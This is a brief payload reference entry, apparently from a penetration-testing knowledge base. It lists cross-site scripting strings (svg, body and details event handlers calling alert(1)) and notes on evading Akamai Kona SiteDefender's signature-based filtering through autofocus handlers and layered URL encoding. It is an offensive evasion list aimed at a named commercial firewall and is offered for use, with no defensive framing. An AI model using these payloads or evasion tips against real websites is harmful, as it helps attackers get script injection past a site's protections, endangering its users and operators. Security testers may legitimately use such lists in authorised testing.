---
id: WAF-BYPASS-020
title: Kona SiteDefender (Akamai) WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# Kona SiteDefender (Akamai) WAF Bypass Payloads

## XSS Bypasses (6+)

1. `<svg onload=alert(1)>`
2. `<body onload=alert(1)>`
3. `<details open ontoggle=alert(1)>`
4. Event handler-based XSS
5. URL encoding variations
6. Double encoding techniques

## HTML Injection

- HTML injection via parameter manipulation

## Technique Notes

- Kona is Akamai's WAF; it has signature-based detection that can be evaded
- Event handlers with autofocus are effective
- Multiple encoding layers can bypass signature matching
